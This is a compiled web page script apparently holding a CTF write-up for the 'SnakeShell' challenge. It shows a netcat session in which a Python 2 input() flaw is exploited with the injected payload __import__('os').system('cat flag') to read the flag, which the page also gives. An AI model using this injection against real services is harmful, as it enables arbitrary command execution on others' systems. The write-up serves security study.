import{_ as a,c as e,o as n,ah as t}from"./chunks/framework.CdwlI3v5.js";const u=JSON.parse(`{"title":"","description":"","frontmatter":{"_layout":"writeup","ctf":"WhiteHats CTF 2021","chal":"SnakeShell","category":"misc","flag":"WH2021{Heh_wH0'5_tH3_0ne_wH0_G0T_pwned!}","points":972,"solves":16},"headers":[],"relativePath":"writeups/2021/WhiteHats 2021/SnakeShell/2021-03-07-SnakeShell.md","filePath":"writeups/2021/WhiteHats 2021/SnakeShell/2021-03-07-SnakeShell.md"}`),i={name:"writeups/2021/WhiteHats 2021/SnakeShell/2021-03-07-SnakeShell.md"};function p(l,s,r,o,c,h){return n(),e("div",null,[...s[0]||(s[0]=[t(`<blockquote><p>We have employed the best snakes in the industry to perform automatic hacking for you. You simply need to enter the target IP address and number of tries and it will infiltrate the system for you.</p></blockquote><blockquote><p>All will be done so easily, just like what you see in movies. Experience the power of this tool now!</p></blockquote><p>As we aren&#39;t given any files and only a server, first thing to do is to fuzz the server with unexpected input. It expects an IP address and integer, but what if we gave a string?</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>ariana@ariana ~&gt; nc chals.whitehacks.ctf.sg 10111</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        Hacking Machine 1.0 Pro Max Super</span></span>
<span class="line"><span>        Makes hacking as easy as in movies.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Please enter the IP address of your enemy: asd</span></span>
<span class="line"><span>Enter the number of tries: asd</span></span>
<span class="line"><span>Traceback (most recent call last):</span></span>
<span class="line"><span>  File &quot;./snake.py&quot;, line 9, in &lt;module&gt;</span></span>
<span class="line"><span>    num = int(input(&quot;Enter the number of tries: &quot;))</span></span>
<span class="line"><span>  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span></span>
<span class="line"><span>NameError: name &#39;asd&#39; is not defined</span></span></code></pre></div><p>We immediately see the flaw is because it uses python2 <code>input</code>. This reminded me of <a href="https://ctftime.org/writeup/20660" target="_blank" rel="noreferrer">this writeup</a> that cheezed an entire crypto challenge in DefCon quals 2020, hence I tried it and got the flag!</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>ariana@ariana ~&gt; nc chals.whitehacks.ctf.sg 10111</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        Hacking Machine 1.0 Pro Max Super</span></span>
<span class="line"><span>        Makes hacking as easy as in movies.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Please enter the IP address of your enemy: asd</span></span>
<span class="line"><span>Enter the number of tries: __import__(&#39;os&#39;).system(&#39;cat flag&#39;)</span></span>
<span class="line"><span>WH2021{Heh_wH0&#39;5_tH3_0ne_wH0_G0T_pwned!}</span></span>
<span class="line"><span>HACKING asd IN PROGRESS...</span></span>
<span class="line"><span>Exploit started, attacking asd</span></span>
<span class="line"><span>HACKING COMPLETED. YOU ARE IN!</span></span></code></pre></div>`,6)])])}const g=a(i,[["render",p]]);export{u as __pageData,g as default};
